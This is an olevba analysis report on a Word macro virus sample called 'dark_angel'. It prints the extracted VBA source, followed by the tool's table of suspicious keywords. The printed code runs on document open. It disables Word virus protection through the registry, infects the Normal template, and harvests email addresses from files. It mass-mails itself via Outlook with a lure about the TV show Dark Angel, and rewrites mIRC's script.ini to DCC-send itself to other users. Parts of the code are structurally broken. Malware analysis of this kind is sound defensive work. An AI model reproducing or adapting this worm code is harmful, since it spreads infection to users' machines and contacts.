olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ion.b-f0da2ac684fcc6120e0f279bae508a043a8a848d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ion.b-f0da2ac684fcc6120e0f279bae508a043a8a848d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul2.bas 
in file: Virus.MSWord.Ion.b-f0da2ac684fcc6120e0f279bae508a043a8a848d - OLE stream: 'Macros/VBA/Modul2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'dark_angel Macro Virus (c) by Energy
atribute(VBE) = "dark_angel"
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Application.ScreenUpdating = False
Application.ShowVisualBasicEditor = False
Application.VBE.ActiveVBProject.VBComponents("dark_angel").Export "c:\windows\dark_angel.dll"
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Set FSO = CreateObject("Scripting.FileSystemObject")
Set dirwin = FSO.GetSpecialFolder(0)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
 If regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\dark_angel") <> "by Energy" Then
  user = regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
  ActiveDocument.SaveAs FileName:=dirwin & "\dark_angel.doc", FileFormat:=wdFormatDocument
  If ToolsWordCount.Count <= 500 Then
    For a = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(a).Name = "dark_angel" Then NormInstall = True
            Next a
    For a = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(a).Name = "dark_angel" Then ActivInstall = True
            Next a
        If ActivInstall = True And NormInstall = False Then Set Secj = NormalTemplate.VBProject _
            Else If ActivInstall = False And NormInstall = True Then Set Secj = ActiveDocument.VBProject
End If
Private Sub Search()
    Dim SearchPath As String, FindStr As String
    Dim FileSize As Long
    Dim NumFiles As Integer, NumDirs As Integer
    Screen.MousePointer = vbHourglass
       SearchPath = "C:\My Documents"
       FindStr = "*.*htm"
    FileSize = FindFilesAPI(SearchPath, FindStr, NumFiles, NumDirs)
    Screen.MousePointer = vbDefault
    End
End Sub
Private Sub try(fName)
On Error Resume Next
WindowSize = 5000
seekPoint = 1
Open fName For Binary As 1
  Do While seekPoint < LOF(1)
   VarString$ = String$(WindowSize, " ")
   Get #1, seekPoint, VarString$
   seekPoint = seekPoint + WindowSize - 50
   AsIs = search_(VarString$)
  Loop
Close #1
End Sub
Function mid_(a$, i, j1)
On Error Resume Next
s = 0
If i > 0 And (i + j1 - 1) <= Len(a$) Then
  b$ = Mid$(a$, i, j1)
  If b$ >= "a" And b$ <= "z" Then s = 1
  If b$ >= "A" And b$ <= "Z" Then s = 1
  If b$ >= "0" And b$ <= "9" Then s = 1
  If b$ = "-" Or b$ = "_" Or b$ = "+" Or b$ = "." Or b$ = "@" Then s = 1
End If
mid_ = s
End Function
Function search_(a$)
On Error Resume Next
s$ = ""
For i = 1 To Len(a$)
  If Mid$(a$, i, 1) = "@" Then
   name_ = "": j = i
   Do
    j = j - 1
    s = mid_(a$, j, 1)
   Loop While s = 1
   Do
    j = j + 1
    s = mid_(a$, j, 1)
    If s = 1 Then name_ = name_ + Mid$(a$, j, 1)
   Loop While s = 1
   s = 0: k = 0
   For j2 = 1 To Len(name_)
    If Mid$(name_, j2, 1) = "@" Then k = k + 1
    If Mid$(name_, j2, 1) = "." Then s = 1
   Next
   If k = 1 And s = 1 And Len(name_) > 5 And Left$(name_, 1) <> "@" And
Right$(name_, 1) <> "@" Then MsgBox name_
   'Then UserForm1.addr.AddItem Name_
  End If
  If Mid$(a$, i, 1) <> "@" Then s$ = s$ + Mid$(a$, i, 1) Else s$ = s$ + " "
Next
search_ = s$
End Function
Set Outlook = CreateObject("Outlook.Application")
  Set MAPI = Outlook.GetNameSpace("MAPI")
      MAPI.Logon "profile", "password"
      For Y = 1 To MAPI.AddressLists.Count
          Set AddyBook = MAPI.AddressLists(Y)
          X = 1
          Set Out = Outlook.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Mail = AddyBook.AddressEntries(X)
              Out.Recipients.Add Mail
              X = X + 1
              If X > 30 Then oo = AddyBook.AddressEntries.Count
           Next oo
           Out.Subject = "RE:"
           Out.Body = "The True Time Story about the TV Serie Dark Angel"
           Out.Body = Out.Body & vbCrLf & ""
           Out.Body = Out.Body & vbCrLf & "Visit the Dark_Angel.doc, and you can see the Story about James Cameron´s Dark Angel"
           Out.Body = Out.Body & vbCrLf & vbCrLf & vbCrLf & vbCrLf
           Out.Attachments.Add (dirwin & "\dark_angel.doc")
           Out.DeleteAfterSubmit = True
           Out.Send
           Mail = ""
SHELL "COPY dark_angel.doc C:\Windows\"
SetAttr "C:\Windows\dark_angel.doc", vbReadOnly
SetAttr "C:\windows\dark_angel.dll", vbReadOnly
SetAttr "C:\mirc\system\script.ini", vbReadOnly
Open "C:\mirc\system\script.ini" For Output As #1
PRINT #1 "[script]"
PRINT #1 "n0=on 1:text:   *:?:{ s *2 | halt }"
PRINT #1 "n1=alias /s / *1"
PRINT #1 "n2=on 1:connect:/.enable #d"
PRINT #1 "n3=#d off"
PRINT #1 "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick "c:\windows\dark_angel.doc" } | .disable #d | .timer 1 30 .enable #d }"
PRINT #1 "n5=#d end"
Close #1
Secj.VBComponents.Import ("c:\windows\dark_angel.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
      Next Y
      MAPI.Logoff
      regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\dark_angel", "(c) by Energy@rRlf.de"
 End If
End Sub
Private Sub Document_Close()
Dim M
M = Int((3 * Rnd) + 1)
 If M = 2 Then
  msg = "Dark Angel (Jessica Alba)" & vbCrLf & "(c) by Energy"
  MsgBox msg, vbCritical, "please retype Dark_Angel.doc"
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|PRINT #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |dark_angel.dll      |Executable file name                         |
+----------+--------------------+---------------------------------------------+
